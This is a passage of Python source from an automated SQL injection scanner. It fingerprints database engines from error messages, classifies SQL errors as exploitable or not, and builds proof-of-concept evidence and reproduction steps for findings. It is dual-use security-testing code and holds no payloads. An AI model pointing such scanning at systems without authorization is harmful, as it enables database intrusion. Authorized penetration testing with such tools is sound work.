            status = resp.get("status", 0)
            error = resp.get("error")
            elapsed = max(0.0, time.perf_counter() - start)
            headers = resp.get("headers", {}) if isinstance(resp.get("headers", {}), dict) else {}
            if method == "POST":
                request_url = target
                request_body = urlencode(params)
            else:
                request_body = ""
            poc_request = self._build_poc_request(
                method=method,
                request_url=request_url,
                body=request_body,
            )
            poc_response = self._build_poc_response(status=status, body=body, headers=headers)

            # RequestGuard などでブロックされた場合
            if error or status == 0:
                logger.warning(f"[{self.name}] Request blocked or failed: {error}")
                return {
                    "status": status,
                    "diff": "blocked",
                    "body_snippet": f"Blocked: {error}",
                    "elapsed_seconds": elapsed,
                    "poc_request": poc_request,
                    "poc_response": poc_response,
                }

            # Day 1強化: DB別エラーパターンマッチング
            db_detection = self._detect_database_type(body)
            error_classification = self._classify_sql_error(body)

            # 従来の基本パターンも維持
            sql_errors = [
                "SQL syntax", "mysql_fetch", "ORA-", "PostgreSQL", "SQLite",
                "ODBC", "JDBC", "unclosed quotation mark", "syntax error",
                "mariadb"
            ]
            basic_diff = "error" if any(err.lower() in body.lower() for err in sql_errors) else "normal"

            # Day 1強化: より詳細なエラー分類を使用
            diff = error_classification["type"] if error_classification["type"] != "none" else basic_diff

            # Day 1強化: DB検出情報を結果に含める
            return {
                "status": status,
                "diff": diff,
                "body_snippet": body[:200],
                "elapsed_seconds": elapsed,
                "db_detection": db_detection,
                "error_classification": error_classification,
                "poc_request": poc_request,
                "poc_response": poc_response,
            }

        except Exception as e:
            logger.error(f"[{self.name}] Request failed: {e}")
            return {
                "status": 0,
                "diff": "error",
                "body_snippet": str(e),
                "elapsed_seconds": 0.0,
            }

    @staticmethod
    def _build_poc_request(*, method: str, request_url: str, body: str = "") -> str:
        parsed = urlparse(str(request_url or ""))
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"
        host = parsed.netloc or parsed.hostname or "target"
        lines = [f"{str(method or 'GET').upper()} {path} HTTP/1.1", f"Host: {host}"]
        if body:
            lines.append("Content-Type: application/x-www-form-urlencoded")
            lines.append("")
            lines.append(body)
        return "\n".join(lines)

    @staticmethod
    def _build_poc_response(*, status: Any, body: str, headers: Dict[str, Any] | None = None) -> str:
        status_int = int(status or 0)
        header_lines = [f"HTTP/1.1 {status_int}"]
        for key, value in (headers or {}).items():
            if str(key).lower() in {"set-cookie", "cookie", "authorization"}:
                continue
            header_lines.append(f"{key}: {value}")
        header_lines.append("")
        header_lines.append(str(body or ""))
        return "\n".join(header_lines)

    # Day 1強化: DB別エラー検出メソッド
    def _detect_database_type(self, body: str) -> Dict[str, Any]:
        """
        レスポンスボディからデータベースタイプを検出
        Returns: {"type": "mysql|postgresql|sqlite|mssql|oracle|unknown", "confidence": float, "patterns": list}
        """
        body_lower = body.lower()
        db_signatures = {
            "mysql": {
                "patterns": [
                    r"mysql_fetch_",
                    r"mysqli_",
                    r"#1064",
                    r"#1062",
                    r"#1146",
                    r"#1054",
                    r"#1366",
                    r"#1292",
                    r"you have an error in your sql syntax.*mysql",
                    r"warning.*mysql",
                ],
                "keywords": ["mysql", "mariadb"]
            },
            "postgresql": {
                "patterns": [
                    r"postgresql",
                    r"pqerror",
                    r"pg_query",
                    r"pg_connect",
                    r"psycopg2",
                    r"psql",
                    r"error.*postgresql",
                    r"warning.*postgresql",
                ],
                "keywords": ["postgresql", "psycopg2"]
            },
            "sqlite": {
                "patterns": [
                    r"sqlite3",
                    r"sqlite_",
                    r"sqliteexception",
                    r"near\s+\w+:\s*syntax error",
                    r"unrecognized token",
                    r"incomplete input",
                    r"misuse of aggregate",
                ],
                "keywords": ["sqlite", "sqlite3"]
            },
            "mssql": {
                "patterns": [
                    r"microsoft sql",
                    r"mssql",
                    r"odbc.*sql server",
                    r"sql server.*error",
                    r"oledb",
                    r"sqlcmd",
                ],
                "keywords": ["mssql", "sql server", "microsoft"]
            },
            "oracle": {
                "patterns": [
                    r"ora-\d{4,5}",
                    r"oracle",
                    r"pl/sql",
                    r"tns:",
                    r"oraclerror",
                    r"ora_",
                ],
                "keywords": ["oracle", "ora-"]
            },
        }

        scores = {db: 0 for db in db_signatures}
        matched_patterns = []

        for db_name, signatures in db_signatures.items():
            # パターンマッチング
            for pattern in signatures["patterns"]:
                if re.search(pattern, body_lower):
                    scores[db_name] += 2
                    matched_patterns.append(f"{db_name}:{pattern}")
            # キーワードマッチング
            for keyword in signatures["keywords"]:
                if keyword in body_lower:
                    scores[db_name] += 1

        if not matched_patterns:
            return {"type": "unknown", "confidence": 0.0, "patterns": []}

        best_db = max(scores, key=scores.get)
        best_score = scores[best_db]
        total_score = sum(scores.values())

        confidence = min(1.0, best_score / max(total_score, 3))

        return {
            "type": best_db if best_score > 0 else "unknown",
            "confidence": round(confidence, 2),
            "patterns": matched_patterns,
            "all_scores": scores,
        }

    def _classify_sql_error(self, body: str) -> Dict[str, Any]:
        """
        SQLエラーを詳細に分類
        Returns: {"type": "syntax|auth|schema|data|none", "severity": "high|medium|low", "details": str}
        """
        body_lower = body.lower()

        # シンタックスエラーパターン
        syntax_patterns = [
            r"syntax error",
            r"sql syntax",
            r"you have an error in your sql syntax",
            r"mysqli_sql_exception",
            r"mysql_sql_exception",
            r"unclosed quotation mark",
            r"unexpected token",
            r"unexpected end of statement",
            r"parse error",
            r"invalid syntax",
            r"near.*syntax error",
            r"missing.*in expression",
            r"missing.*at or near",
        ]

        # 認証/権限エラーパターン
        auth_patterns = [
            r"access denied",
            r"permission denied",
            r"insufficient privileges",
            r"not authorized",
            r"login failed",
            r"authentication failed",
            r"invalid user",
            r"wrong password",
        ]

        # スキーマ/テーブルエラーパターン
        schema_patterns = [
            r"table.*doesn't exist",
            r"table.*does not exist",
            r"unknown table",
            r"unknown column",
            r"column.*not found",
            r"no such table",
            r"no such column",
            r"invalid object name",
        ]

        # データ型エラーパターン
        data_patterns = [
            r"data type mismatch",
            r"invalid.*for type",
            r"incorrect.*value",
            r"out of range",
            r"overflow",
            r"truncated",
        ]

        for pattern in syntax_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "syntax",
                    "severity": "high",
                    "details": f"Syntax error detected: {pattern}",
                    "exploitable": True,
                }

        for pattern in auth_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "auth",
                    "severity": "medium",
                    "details": f"Authentication/Permission error: {pattern}",
                    "exploitable": False,
                }

        for pattern in schema_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "schema",
                    "severity": "medium",
                    "details": f"Schema error (information leakage): {pattern}",
                    "exploitable": True,
                }

        for pattern in data_patterns:
            if re.search(pattern, body_lower):
                return {
                    "type": "data",
                    "severity": "low",
                    "details": f"Data type error: {pattern}",
                    "exploitable": True,
                }

        return {"type": "none", "severity": "none", "details": "", "exploitable": False}


def _build_sqli_evidence_and_impact(
    result: Dict[str, Any], target_url: str
) -> Tuple[Dict[str, Any], Optional[str], Optional[list]]:
    """SGK-2026-0449 Scope B: observed-request evidence + impact/repro fill
    for error-based SQLi findings.

    Composes the two pure helpers from manager_internal.injection_evidence_fields.
    Fail-closed: without a complete sql_error observation the evidence
    kwargs stay empty and impact/reproduction_steps are None — the Finding
    construction then keeps its current fields (bar unchanged). The import
    is function-local to avoid the manager_internal package import cycle.

    SGK-2026-0452 (opt-in, layered on the 0451 fire path): when the impact-demo
    gate is on, the evidence URL/status and the impact payload are pinned to
    the ERROR-OBSERVATION probe (result["poc_request"] is already the pinned
    error pair, A-2) instead of the last payload sent, and the observed
    impact-probe records are passed through for the enhanced impact fill.
    Gate off -> byte-identical 0451 calls (no new kwargs).
    """
    # 循環回避のため関数内 import（manager_internal/__init__ が manager 系を推移 import）
    from src.core.agents.swarm.injection.manager_internal.injection_evidence_fields import (
        build_sqli_impact_and_reproduction_steps,
        build_sqli_observed_evidence,
        parse_observed_request_url,
    )

    sql_error_observed = bool(result.get("sql_error_observed", False))
    rd = result.get("response_differential", {})
    if not isinstance(rd, dict):
        rd = {}
    see = result.get("sql_error_evidence", {})
    if not isinstance(see, dict):
        see = {}

    observed_kwargs: Dict[str, Any] = {}
    payload_arg = (result.get("payloads_used") or [""])[-1]
    impact_kwargs: Dict[str, Any] = {}
    if SmartSQLiHunter._impact_demo_enabled() and sql_error_observed:
        # SGK-2026-0452 A-4: payload/status/URL pinned to the error
        # observation probe — the evidence chain must belong to ONE request.
        error_payload = str(see.get("payload", "") or "")
        if error_payload:
            payload_arg = error_payload
        error_url = parse_observed_request_url(
            str(result.get("poc_request", "") or ""), target_url
        )
        if error_url:
            observed_kwargs["evidence_request_url"] = error_url
        try:
            error_status = int(rd.get("attack_status", 0) or 0)
        except (TypeError, ValueError):
            error_status = 0
        if not isinstance(error_status, bool) and error_status > 0:
            observed_kwargs["evidence_status"] = error_status
        impact_kwargs["impact_probe_records"] = (
            result.get("impact_probe_records") or None
        )

    observed = build_sqli_observed_evidence(
        target_url=target_url,
        poc_request=str(result.get("poc_request", "") or ""),
        poc_response=str(result.get("poc_response", "") or ""),
        attack_status=rd.get("attack_status", 0),
        sql_error_observed=sql_error_observed,
        **observed_kwargs,
    )
    impact, steps = build_sqli_impact_and_reproduction_steps(
        parameter=result.get("param"),
        payload=payload_arg,
        method=observed.get("request_method") if observed else None,
        request_url=observed.get("request_url") if observed else None,
        response_status=observed.get("response_status") if observed else None,
        sql_error_observed=sql_error_observed,
        marker_excerpt=see.get("body_snippet", ""),
        **impact_kwargs,
    )
    return observed, impact, steps
